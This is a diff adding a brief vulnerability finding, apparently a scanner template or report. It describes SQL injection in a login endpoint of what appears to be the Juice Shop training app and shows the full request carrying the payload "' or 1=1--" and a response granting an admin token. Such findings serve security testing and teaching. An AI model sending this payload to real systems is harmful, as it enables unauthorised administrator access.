@@ -1,0 +1,20 @@
+SQL Injection vulnerability in a login endpoint allows authenticate as a administrator.
+
+HTTP Request:
+
+POST /rest/user/login HTTP/1.1
+Host: {{Hostname}}
+User-Agent: Mozilla/5.0
+Content-Type: application/json
+
+{"email":"' or 1=1--","password":"123"}
+
+HTTP Response:
+
+HTTP/1.1 200 OK
+Content-Type: application/json
+Content-Length: 1337
+
+{"authentication":{"token":"xyz","bid":1,"umail":"admin@juice-sh.op"}}
+
+The application improperly handles user input in the email input, leading to an SQL Injection vulnerability.
